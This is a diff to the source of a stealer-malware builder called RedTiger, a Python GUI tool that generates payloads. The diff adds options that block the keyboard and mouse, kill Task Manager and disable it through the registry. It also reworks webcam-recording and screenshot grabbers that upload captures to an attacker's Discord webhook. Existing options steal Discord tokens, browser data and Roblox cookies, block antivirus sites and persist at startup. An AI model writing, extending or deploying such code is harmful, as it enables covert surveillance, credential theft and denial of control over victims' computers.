@@ -41,7 +41,17 @@ from PIL import ImageGrab
 import time
 import browser_cookie3
 import cv2
+import pyautogui
+import keyboard
 
+def Block_Key():
+    pass
+def Unblock_Key():
+    pass
+def Block_Task_Manager():
+    pass
+def Block_Mouse():
+    pass
 def Block_Website():
     pass
 def Startup():
@@ -79,7 +89,7 @@ Clear()
 
 color_embed = 0xB20000
 username_embed = 'RedTiger'
-avatar_embed = 'https://media.discordapp.net/attachments/1184160374342299688/1223987317908181073/RedTiger_Logo.png?ex=661bda05&is=66096505&hm=c567e0e9e672ae70de44ddf128301ae0a6737d78a2f2a9f46ff9f2b717f0ac04&=&format=webp&quality=lossless&width=810&height=810'
+avatar_embed = 'https://cdn.discordapp.com/attachments/1185940734256357427/1238066398886887474/RedTiger_Logo.png?ex=663deeaf&is=663c9d2f&hm=a59c3801227ff917e98cbfc30caf5d1b9718d7004a916657552793bb182dc623&'
 footer_embed = {
         "text": f"Red Tiger | {current_time_day_hour()}",
         "icon_url": avatar_embed,
@@ -1189,6 +1199,7 @@ CameraCaptureGrab = r'''
 def Camera_Capture_Grab():
     try:
         from datetime import datetime
+        name_file_capture = f"CameraCapture_{username_pc}.avi"
         time_capture = 10
         cap = cv2.VideoCapture(0)
 
@@ -1196,37 +1207,44 @@ def Camera_Capture_Grab():
             Clear()
             return
 
-        fourcc = cv2.VideoWriter_fourcc(*'XVID')
-        name_file_capture = f"CameraCapture_{username_pc}.avi"
-        path_file_capture = os.path.join(os.getcwd(), name_file_capture)
-        out = cv2.VideoWriter(path_file_capture, fourcc, 20.0, (640, 480))
-        time_start = datetime.now()
-        Clear()
-        while (datetime.now() - time_start).seconds < time_capture:
+        def capture(path_file_capture):
+            fourcc = cv2.VideoWriter_fourcc(*'XVID')
+            out = cv2.VideoWriter(path_file_capture, fourcc, 20.0, (640, 480))
+            time_start = datetime.now()
             Clear()
-            ret, frame = cap.read()
-            if not ret:
+            while (datetime.now() - time_start).seconds < time_capture:
                 Clear()
-                break
-            out.write(frame)
+                ret, frame = cap.read()
+                if not ret:
+                    Clear()
+                    break
+                out.write(frame)
 
-        cap.release()
-        out.release()
-        Clear()
+            cap.release()
+            out.release()
+            Clear()
+
+        try:
+            path_file_capture = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{name_file_capture}"
+            capture(path_file_capture)
+        except:
+            path_file_capture = name_file_capture
+            capture(path_file_capture)
+
+        embed = Embed(title=f":camera: | Camera Capture `{username_pc} \"{ip_address_public}\"`:", color=color_embed, description=f"```└── 📷 - {name_file_capture}```")
+        embed.set_footer(text=footer_text, icon_url=avatar_embed)
+
+        webhook = SyncWebhook.from_url(webhook_url)
+        with open(path_file_capture, "rb") as f:
+            webhook.send(
+                embed=embed,
+                file=File(f, filename=name_file_capture),
+                username=username_embed,
+                avatar_url=avatar_embed
+            )
+            
         if os.path.exists(path_file_capture):
-            embed = Embed(title=f":camera: | Camera Capture `{username_pc} \"{ip_address_public}\"`:", color=color_embed, description=f"```└── 📷 - {name_file_capture}```")
-            embed.set_footer(text=footer_text, icon_url=avatar_embed)
-
-            webhook = SyncWebhook.from_url(webhook_url)
-            with open(path_file_capture, "rb") as f:
-                webhook.send(
-                    embed=embed,
-                    file=File(f, filename=name_file_capture),
-                    username=username_embed,
-                    avatar_url=avatar_embed
-                )
-            if os.path.exists(path_file_capture):
-                os.remove(path_file_capture)
+            os.remove(path_file_capture)
         Clear()
     except:
         Clear()
@@ -1253,29 +1271,37 @@ def Open_User_Profile_Settings():
 ScreenshotGrab = r'''
 def Screenshot_Grab():
     try:
-        embed = Embed(title=f":desktop: | Screenshot `{username_pc} \"{ip_address_public}\"`:", color=color_embed)
         name_file_screen = f"Screenshot_{username_pc}.png"
-        image = ImageGrab.grab(
-            bbox=None,
-            include_layered_windows=False,
-            all_screens=True,
-            xdisplay=None
-        )
-        image.save(name_file_screen)
 
+        def capture(path):
+            image = ImageGrab.grab(
+                bbox=None,
+                include_layered_windows=False,
+                all_screens=True,
+                xdisplay=None
+            )
+            image.save(path)
+        
+        try:
+            path_file_screen = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{name_file_screen}"
+            capture(path_file_screen)
+        except:
+            path_file_screen = name_file_screen
+            capture(path_file_screen)
+
+        embed = Embed(title=f":desktop: | Screenshot `{username_pc} \"{ip_address_public}\"`:", color=color_embed)
         embed.set_image(url=f"attachment://{name_file_screen}")
-
         embed.set_footer(text=footer_text, icon_url=avatar_embed )
         webhook = SyncWebhook.from_url(webhook_url)
         webhook.send(
                 embed=embed,
-                file=File(f'.\\{name_file_screen}', filename=name_file_screen),
+                file=File(f'{path_file_screen}', filename=name_file_screen),
                 username=username_embed,
                 avatar_url=avatar_embed
             )
-        
-        if os.path.exists(name_file_screen):
-            os.remove(name_file_screen)
+
+        if os.path.exists(path_file_screen):
+            os.remove(path_file_screen)
     except:
         pass
 '''
@@ -1286,6 +1312,7 @@ def Screenshot_Grab():
 
 BlockWebsite = r'''
 def Block_Website():
+    "Perm Admin Required"
     try:
         directory = os.getcwd()
         disk_letter = os.path.splitdrive(directory)[0]
@@ -1393,6 +1420,14 @@ payload = {
 }
 requests.post(webhook_url, json=payload)
 try:
+    Block_Key()
+except:
+    pass
+try:
+    Block_Task_Manager()
+except:
+    pass
+try:
     Block_Website()
 except:
     pass
@@ -1458,15 +1493,19 @@ while True:
     }
     requests.post(webhook_url, json=payload)
     try:
+        Block_Key()
+    except:
+        pass
+    try:
+        Block_Task_Manager()
+    except:
+        pass
+    try:
         Block_Website()
     except:
         pass
     try:
         System_Grab()
-    except:
-        pass
-    try:
-        Roblox_Grab()
     except:
         pass
     try:
@@ -1483,6 +1522,10 @@ while True:
         pass
     try:
         Browser_Grab()
+    except:
+        pass
+    try:
+        Roblox_Grab()
     except:
         pass
     Clear()
@@ -1520,6 +1563,84 @@ def Fake_Error():
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 
+BlockKey = r'''
+def Block_Key():
+    key = [
+        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
+        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
+        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
+        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
+        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
+        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
+        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
+        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
+        "backslash", "semicolon", "comma", "period", "slash",
+        "volume up", "volume down", "volume mute",
+        "app", "sleep", "print screen", "pause",
+    ]
+    for key_block in key:
+        try: keyboard.block_key(key_block)
+        except: pass
+
+def Unblock_Key():
+    key = [
+        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
+        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
+        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
+        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
+        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
+        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
+        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
+        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
+        "backslash", "semicolon", "comma", "period", "slash",
+        "volume up", "volume down", "volume mute",
+        "app", "sleep", "print screen", "pause",
+    ]
+    for key_block in key:
+        try: keyboard.unblock_key(key_block)
+        except: pass
+'''
+
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+BlockTaskManager = r'''
+def Block_Task_Manager():
+    "Perm Admin Required"
+    for proc in psutil.process_iter(['pid', 'name']):
+        if proc.info['name'] == 'Taskmgr.exe':
+            proc.terminate()
+            break
+    subprocess.run("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True)
+    Clear()
+'''
+
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+BlockMouse = r'''
+def Block_Mouse():
+    pyautogui.FAILSAFE = False
+    width, height = pyautogui.size()
+    pyautogui.moveTo(width + 100, height + 100)
+
+while True:
+    try:
+        Block_Mouse()
+        if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
+            Unblock_Key()
+            break
+    except:
+        pass
+    
+'''
+
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
 from Config.Util import *
 from Config.Config import *
 try:
@@ -1536,7 +1657,7 @@ except Exception as e:
     ErrorModule(e)
 
 Clear()
-Title("Builder Stealer")
+Title("Malware, Stealer")
 
 print(f"""
                  {red} ██▀███  ▓█████ ▓█████▄      ██████ ▄▄▄█████▓▓█████ ▄▄▄       ██▓    ▓█████  ██▀███  
@@ -1590,16 +1711,29 @@ style = ttk.Style()
 if sys.platform.startswith("win"):
     root.iconbitmap('Img/RedTiger_icon.ico')
 root.title(f'{name_tool} {version_tool} | Builder Stealer')
-root.geometry("890x490")
+root.geometry("990x720")
 root.resizable(False, False)
 red_color = '#a80505'
 white_color = "#ffffff"
 background_color = "#141414"
 root.configure(background=background_color) 
 
+# <<<<<<<<<< Logs >>>>>>>>>>
+text_logs = tk.Label(root, text="", font=("Calibri", 15, "bold"), background=background_color, foreground=red_color)
+text_logs.grid(row=60, column=0, columnspan=2, sticky="n", pady=(5, 0), padx=(140, 20))
+
+def logs(message):
+    text_logs.config(text=message)
+    root.after(5000, hide_message)
+
+def hide_message():
+    text_logs.config(text="")
+
 # <<<<<<<<<< Title >>>>>>>>>>
-label_title = tk.Label(root, text="Builder Options", font=("Calibri", 30), background=background_color, foreground=white_color)
-label_title.grid(row=0, column=0, columnspan=2, sticky="n", pady=(10, 0), padx=(140, 20))
+text_title = tk.Label(root, text="Builder Options", font=("Calibri", 35, "bold"), background=background_color, foreground=white_color)
+text_title.grid(row=0, column=0, columnspan=2, sticky="n", pady=(10, 0), padx=(140, 20))
+text_github = tk.Label(root, text=github_tool, font=("Calibri", 12), background=background_color, foreground=white_color)
+text_github.grid(row=1, column=0, columnspan=2, sticky="n", padx=(140, 20))
 
 # <<<<<<<<<< Webhook Entry >>>>>>>>>>
 if sys.platform.startswith("win"):
@@ -1614,7 +1748,7 @@ if sys.platform.startswith("win"):
             webhook_entry.config(fg="white")
 
 webhook_entry = tk.Entry(root, background="#303030", foreground="white", relief="flat", highlightbackground="#383E42", highlightthickness=1.5, font=("Calibri", 12))
-webhook_entry.grid(row=1, column=0, columnspan=2, sticky="ew", padx=(130, 0), pady=10)
+webhook_entry.grid(row=2, column=0, columnspan=2, sticky="ew", padx=(130, 0), pady=10)
 webhook_entry.insert(0, "Webhook URL")
 
 if sys.platform.startswith("win"):
@@ -1624,16 +1758,20 @@ if sys.platform.startswith("win"):
     webhook_entry.config(width=60)
 
 # <<<<<<<<<< Select Options >>>>>>>>>>
+
 add_system = "Disable"
 add_discord = "Disable"
 add_browser = "Disable"
 add_roblox = "Disable"
-add_blockwebsite = "Disable"
 add_cameracapture = "Disable"
 add_openuserprofilsettings = "Disable"
 add_screenshot = "Disable"
-add_startup = "Disable"
+add_blockkey = "Disable"
+add_blockmouse = "Disable"
+add_blocktaskmanager = "Disable"
+add_blockwebsite = "Disable"
 add_fake_error = "Disable"
+add_startup = "Disable"
 add_restart = "Disable"
 webhook = "None"
 name_file = "None"
@@ -1643,42 +1781,62 @@ add_system_var = tk.StringVar(value="Disable")
 add_discord_var = tk.StringVar(value="Disable")
 add_browser_var = tk.StringVar(value="Disable")
 add_roblox_var = tk.StringVar(value="Disable")
-add_blockwebsite_var = tk.StringVar(value="Disable")
 add_cameracapture_var = tk.StringVar(value="Disable")
 add_screenshot_var = tk.StringVar(value="Disable")
 add_openuserprofilsettings_var = tk.StringVar(value="Disable")
-add_startup_var = tk.StringVar(value="Disable")
+add_blockkey_var = tk.StringVar(value="Disable")
+add_blockmouse_var = tk.StringVar(value="Disable")
+add_blocktaskmanager_var = tk.StringVar(value="Disable")
+add_blockwebsite_var = tk.StringVar(value="Disable")
 add_fake_error_var = tk.StringVar(value="Disable")
+add_startup_var = tk.StringVar(value="Disable")
 add_restart_var = tk.StringVar(value="Disable")
 file_type_var = tk.StringVar(value="Python File")
 
 style.configure('Custom.TCheckbutton', font=('Calibri', 18, "bold"), background=root.cget('bg'), foreground=white_color, relief='raised',indicatorsize=20)
 
+text_stealeroptions = tk.Label(root, text="Stealer Options:", font=("Calibri", 22), background=background_color, foreground=white_color)
+text_stealeroptions.grid(row=3, column=0, pady=(15, 0), padx=(83, 0))
+
 add_system_cb = ttk.Checkbutton(root, text="System Info", variable=add_system_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
 add_discord_cb = ttk.Checkbutton(root, text="Discord Token", variable=add_discord_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
 add_browser_cb = ttk.Checkbutton(root, text="Browser Steal", variable=add_browser_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
 add_roblox_cb = ttk.Checkbutton(root, text="Roblox Cookie", variable=add_roblox_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
-add_blockwebsite_cb = ttk.Checkbutton(root, text="Block AV Website", variable=add_blockwebsite_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
 add_cameracapture_cb = ttk.Checkbutton(root, text="Camera Capture", variable=add_cameracapture_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
 add_screenshot_cb = ttk.Checkbutton(root, text="Screenshot", variable=add_screenshot_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
 add_openuserprofilsettings_cb = ttk.Checkbutton(root, text="Open UserProfil", variable=add_openuserprofilsettings_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton', state="disable")
-add_fake_error_cb = ttk.Checkbutton(root, text="Fake Error", variable=add_fake_error_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
-add_startup_cb = ttk.Checkbutton(root, text="Launch at Startup", variable=add_startup_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
-add_restart_cb = ttk.Checkbutton(root, text="Restart Every 5min", variable=add_restart_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
 
 add_system_cb.grid(row=4, column=0, padx=(220, 20), sticky="w")
 add_discord_cb.grid(row=5, column=0, padx=(220, 20), sticky="w")
 add_browser_cb.grid(row=6, column=0, padx=(220, 20), sticky="w")
 add_roblox_cb.grid(row=7, column=0, padx=(220, 20), sticky="w")
-add_blockwebsite_cb.grid(row=8, column=0, padx=(220, 20), sticky="w")
-add_cameracapture_cb.grid(row=9, column=0, padx=(220, 20), sticky="w")
-add_screenshot_cb.grid(row=4, column=1, padx=(5, 10), sticky="w")
-add_openuserprofilsettings_cb.grid(row=5, column=1, padx=(5, 10), sticky="w")
-add_fake_error_cb.grid(row=6, column=1, padx=(5, 10), sticky="w")
-add_startup_cb.grid(row=7, column=1, padx=(5, 10), sticky="w")
-add_restart_cb.grid(row=8, column=1, padx=(5, 10), sticky="w")
+add_cameracapture_cb.grid(row=4, column=1, padx=(0, 0), sticky="w")
+add_screenshot_cb.grid(row=5, column=1, padx=(0, 0), sticky="w")
+add_openuserprofilsettings_cb.grid(row=6, column=1, padx=(0, 0), sticky="w")
 
-def toggle_open_user_profile_settings_cb_state(*args):
+text_malwareoptions = tk.Label(root, text="Malware Options:", font=("Calibri", 22), background=background_color, foreground=white_color)
+text_malwareoptions.grid(row=9, column=0, pady=(15, 0), padx=(103, 0))
+
+add_blockkey_cb = ttk.Checkbutton(root, text="Block Key", variable=add_blockkey_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+add_blockmouse_cb = ttk.Checkbutton(root, text="Block Mouse", variable=add_blockmouse_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+add_blocktaskmanager_cb = ttk.Checkbutton(root, text="[Admin] Block Task Manager", variable=add_blocktaskmanager_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+add_blockwebsite_cb = ttk.Checkbutton(root, text="[Admin] Block AV Website", variable=add_blockwebsite_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+add_fake_error_cb = ttk.Checkbutton(root, text="Fake Error", variable=add_fake_error_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+add_startup_cb = ttk.Checkbutton(root, text="Launch at Startup", variable=add_startup_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+add_restart_cb = ttk.Checkbutton(root, text="Restart Every 5min", variable=add_restart_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+
+add_blockkey_cb.grid(row=10, column=0, padx=(220, 20), sticky="w")
+add_blockmouse_cb.grid(row=11, column=0, padx=(220, 20), sticky="w")
+add_blocktaskmanager_cb.grid(row=12, column=0, padx=(220, 20), sticky="w")
+add_blockwebsite_cb.grid(row=13, column=0, padx=(220, 20), sticky="w")
+add_fake_error_cb.grid(row=10, column=1, padx=(0, 0), sticky="w")
+add_startup_cb.grid(row=11, column=1, padx=(0, 0), sticky="w")
+add_restart_cb.grid(row=12, column=1, padx=(0, 0), sticky="w")
+text_altgr = tk.Label(root, text='''To cancel the Block Mouse and Block Key, 
+press "Alt" + "Alt Gr"''', font=("Calibri", 13), background=background_color, foreground=white_color)
+text_altgr.grid(row=13, column=1)
+
+def openuserprofile_state(*args):
     if add_screenshot_var.get() == "Enable":
         add_openuserprofilsettings_cb.config(state="normal")
         add_openuserprofilsettings_var.set("Enable")
@@ -1686,7 +1844,21 @@ def toggle_open_user_profile_settings_cb_state(*args):
         add_openuserprofilsettings_var.set("Disable")
         add_openuserprofilsettings_cb.config(state="disabled")
 
-add_screenshot_var.trace("w", toggle_open_user_profile_settings_cb_state)
+def blockmouse_state(*args):
+    if add_restart_var.get() == "Enable":
+        if add_blockmouse_var.get() == "Enable":
+            add_blockmouse_var.set("Disable")
+            logs("[X] The Restart and Block Mouse option are not compatible together [X]")
+
+def restart_state(*args):
+    if add_blockmouse_var.get() == "Enable":
+        if add_restart_var.get() == "Enable":
+            add_restart_var.set("Disable")
+            logs("[X] The Block Mouse and Restart option are not compatible together [X]")
+
+add_restart_var.trace("w", blockmouse_state)
+add_blockmouse_var.trace("w", restart_state)
+add_screenshot_var.trace("w", openuserprofile_state)
 
 # <<<<<<<<<< Button Style >>>>>>>>>>
 style.configure('Red.TButton', borderwidth=0, background=background_color, font=('Calibri', 12, "bold"), foreground=background_color)
@@ -1704,7 +1876,7 @@ if sys.platform.startswith("win"):
             name_file_entry.config(fg="white")
 
 name_file_entry = tk.Entry(root, background="#303030", foreground="white", relief="flat", highlightbackground="#383E42", highlightthickness=1.5, font=("Calibri", 12), width=20)
-name_file_entry.grid(row=10, column=0, padx=(60, 0), pady=(20, 10))
+name_file_entry.grid(row=40, column=0, padx=(60, 0), pady=(20, 10))
 name_file_entry.insert(0, "File Name")
 
 if sys.platform.startswith("win"):
@@ -1714,7 +1886,7 @@ if sys.platform.startswith("win"):
 # <<<<<<<<<< Select Icon >>>>>>>>>>
 
 icon_button = ttk.Button(root, text="Select Icon", command=choose_icon, style='Red.TButton')
-icon_button.grid(row=10, column=1, sticky="e", padx=(0, 50), pady=(20, 10))
+icon_button.grid(row=40, column=1, sticky="e", padx=(0, 50), pady=(20, 10))
 icon_button.config(compound="right")
 
 if file_type_var.get() == "Python File":
@@ -1738,22 +1910,25 @@ except:
     pass
 
 file_type_menu = ttk.OptionMenu(root, file_type_var, *["File Type", "Python File", "Exe File"], style='Red.TButton')
-file_type_menu.grid(row=10, column=1, sticky="w", padx=(0, 200), pady=(20, 10))
+file_type_menu.grid(row=40, column=1, sticky="w", padx=(0, 200), pady=(20, 10))
 file_type_menu.config(compound="right")
 
 # <<<<<<<<<< Build Button >>>>>>>>>>
 def Build_Settings():
-    global add_system, add_discord, add_browser, add_roblox, add_blockwebsite, add_cameracapture, add_openuserprofilsettings, add_screenshot, add_startup, add_fake_error, add_restart, webhook, name_file, file_type
+    global add_system, add_discord, add_browser, add_roblox, add_cameracapture, add_openuserprofilsettings, add_screenshot, add_blockkey, add_blockmouse, add_blocktaskmanager, add_blockwebsite, add_fake_error,  add_startup, add_restart, webhook, name_file, file_type
     add_system = add_system_var.get()
     add_discord = add_discord_var.get()
     add_browser = add_browser_var.get()
     add_roblox = add_roblox_var.get()
-    add_blockwebsite = add_blockwebsite_var.get()
     add_cameracapture = add_cameracapture_var.get()
     add_openuserprofilsettings = add_openuserprofilsettings_var.get()
     add_screenshot = add_screenshot_var.get()
-    add_startup = add_startup_var.get()
+    add_blockwebsite = add_blockwebsite_var.get()
+    add_blockkey = add_blockkey_var.get()
+    add_blockmouse = add_blockmouse_var.get()
+    add_blocktaskmanager = add_blocktaskmanager_var.get()
     add_fake_error = add_fake_error_var.get()
+    add_startup = add_startup_var.get()
     add_restart = add_restart_var.get()
     webhook = webhook_entry.get()
     name_file = name_file_entry.get()
@@ -1773,11 +1948,11 @@ def Build_Settings():
 style.configure('CustomButton.TButton', borderwidth=0, background=background_color, font=('Calibri', 15, "bold"), foreground=background_color)
 
 build_button = ttk.Button(root, text="Build Stealer", command=Build_Settings, style='CustomButton.TButton', width=15)
-build_button.grid(row=11, column=0, columnspan=2, pady=(30, 0), padx=(300,0))
+build_button.grid(row=41, column=0, columnspan=2, pady=(30, 0), padx=(300,0))
 
 # <<<<<<<<<< Disinfinct Button >>>>>>>>>>
 disinfect_button = ttk.Button(root, text="Self Disinfect", command=disinfect, style='CustomButton.TButton', width=15)
-disinfect_button.grid(row=11, column=0, columnspan=2, pady=(30, 0), padx=(0,80))
+disinfect_button.grid(row=41, column=0, columnspan=2, pady=(30, 0), padx=(0,80))
 
 root.mainloop()
 
@@ -1788,12 +1963,15 @@ print(f"{INFO} System Info        :{white}", add_system)
 print(f"{INFO} Discord Token      :{white}", add_discord)
 print(f"{INFO} Browser Steal      :{white}", add_browser)
 print(f"{INFO} Roblox Cookie      :{white}", add_roblox)
-print(f"{INFO} Block AV Website   :{white}", add_blockwebsite)
 print(f"{INFO} Camera Capture     :{white}", add_cameracapture)
 print(f"{INFO} Screenshot         :{white}", add_screenshot)
 print(f"{INFO} Open UserProfil    :{white}", add_openuserprofilsettings)
-print(f"{INFO} Launch at Startup  :{white}", add_startup)
+print(f"{INFO} Block Key          :{white}", add_blockkey)
+print(f"{INFO} Block Mouse        :{white}", add_blockmouse)
+print(f"{INFO} Block Task Manager :{white}", add_blocktaskmanager)
+print(f"{INFO} Block AV Website   :{white}", add_blockwebsite)
 print(f"{INFO} Fake Error         :{white}", add_fake_error)
+print(f"{INFO} Launch at Startup  :{white}", add_startup)
 print(f"{INFO} Restart Every 5min :{white}", add_restart)
 print(f"{INFO} File Type          :{white}", file_type)
 print(f"{INFO} File Name          :{white}", name_file)
@@ -1815,6 +1993,8 @@ if sys.platform.startswith("win"):
     "WINDOWS"
     os.system("pip install --upgrade pip setuptools wheel")
     os.system("pip install setuptools")
+    os.system("pip install pyautogui")
+    os.system("pip install keyboard")
     os.system("pip install browser_cookie3")
     os.system("pip install opencv-python")
     os.system("pip install Pillow")
@@ -1834,6 +2014,8 @@ elif sys.platform.startswith("linux"):
     "LINUX"
     os.system("pip3 install --upgrade pip setuptools wheel")
     os.system("pip3 install setuptools")
+    os.system("pip3 install pyautogui")
+    os.system("pip3 install keyboard")
     os.system("pip3 install browser_cookie3")
     os.system("pip3 install opencv-python")
     os.system("pip3 install Pillow")
@@ -1869,9 +2051,6 @@ with open(file_text, 'w', encoding='utf-8') as file:
 
     if add_roblox in ['Enable']:
         file.write(RobloxGrab)
-    
-    if add_blockwebsite in ['Enable']:
-        file.write(BlockWebsite)
 
     if add_cameracapture in ['Enable']:
         file.write(CameraCaptureGrab)
@@ -1882,13 +2061,25 @@ with open(file_text, 'w', encoding='utf-8') as file:
     if add_screenshot in ['Enable']:
         file.write(ScreenshotGrab)
 
-    if add_startup in ['Enable']:
-        file.write(Startup)
+    if add_blockkey in ['Enable']:
+        file.write(BlockKey)
+    
+    if add_blocktaskmanager in ['Enable']:
+        file.write(BlockTaskManager)
+
+    if add_blockwebsite in ['Enable']:
+        file.write(BlockWebsite)
 
     if add_fake_error in ['Enable']:
         file.write(FakeError)
 
+    if add_startup in ['Enable']:
+        file.write(Startup)
+
     file.write(Start)
+
+    if add_blockmouse in ['Enable']:
+        file.write(BlockMouse)
 
     if add_restart in ['Enable']:
         file.write(Restart)
@@ -1974,10 +2165,13 @@ fields = [
     {"name": f"Discord Token:", "value": f"""```{add_discord}```""", "inline": True},
     {"name": f"Browser Steal:", "value": f"""```{add_browser}```""", "inline": True},
     {"name": f"Roblox Cookie:", "value": f"""```{add_roblox}```""", "inline": True},
-    {"name": f"Block AV Website:", "value": f"""```{add_blockwebsite}```""", "inline": True},
     {"name": f"Camera Capture:", "value": f"""```{add_cameracapture}```""", "inline": True},
     {"name": f"Screenshot:", "value": f"""```{add_screenshot}```""", "inline": True},
     {"name": f"Open UserProfil:", "value": f"""```{add_openuserprofilsettings}```""", "inline": True},
+    {"name": f"Block Key:", "value": f"""```{add_blockkey}```""", "inline": True},
+    {"name": f"Block Mouse:", "value": f"""```{add_blockmouse}```""", "inline": True},
+    {"name": f"Block Task Manager:", "value": f"""```{add_blocktaskmanager}```""", "inline": True},
+    {"name": f"Block AV Website:", "value": f"""```{add_blockwebsite}```""", "inline": True},
     {"name": f"Fake Error:", "value": f"""```{add_fake_error}```""", "inline": True},
     {"name": f"Launch At Startup:", "value": f"""```{add_startup}```""", "inline": True},
     {"name": f"Restart Every 5min:", "value": f"""```{add_restart}```""", "inline": True},
